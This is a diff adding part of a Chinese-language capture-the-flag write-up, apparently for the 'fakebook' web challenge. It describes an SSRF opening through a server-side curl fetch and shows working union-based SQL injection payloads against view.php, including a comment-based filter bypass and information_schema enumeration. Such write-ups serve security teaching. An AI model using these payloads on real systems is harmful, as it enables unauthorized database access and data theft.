@@ -640,4 +640,18 @@ class UserInfo
 ?>
 ```
 这才看到其对blog的内容进行了严格的限制，其格式应为一个url。
-回到join界面，随便输入一个url进行join，再回到主界面，点击用户，发现其会将url的内容显示出来，那么如果构造flag.php的payload那么就可以将flag输出了。上面的类功能“get”负责这个部分。其
+回到join界面，随便输入一个url进行join，再回到主界面，点击用户，发现其会将url的内容显示出来，那么如果构造flag.php的payload那么就可以将flag输出了。上面的类功能“get”负责这个部分。服务器内部发起请求上面的文件，curl的滥用，可以利用ssrf。
+上面的扫描结果还扫出了view.php
+直接访问。页面显示：
+```
+<br />
+<b>Notice</b>:  Undefined index: no in <b>/var/www/html/view.php</b> on line <b>24</b><br />
+<p>[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1)</p><br />
+<b>Fatal error</b>:  Call to a member function fetch_assoc() on boolean in <b>/var/www/html/db.php</b> on line <b>66</b><br />
+```
+发现其有一个参数“no”,构造no=1',其报错，说明可以注入，连续使用order by，到5报错，其有4列数据。
+使用union select 1,2,3,4回显no_hack，使用union/\*\*/select绕过，页面username项显示2，说明2为回显点。
+构造payload：
+`view.php?no=1+union/**/select+1,database(),3,4`爆出库名为fakebook
+
+`/view.php?no=1+union/**/select+1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('fakebook')),3,4`
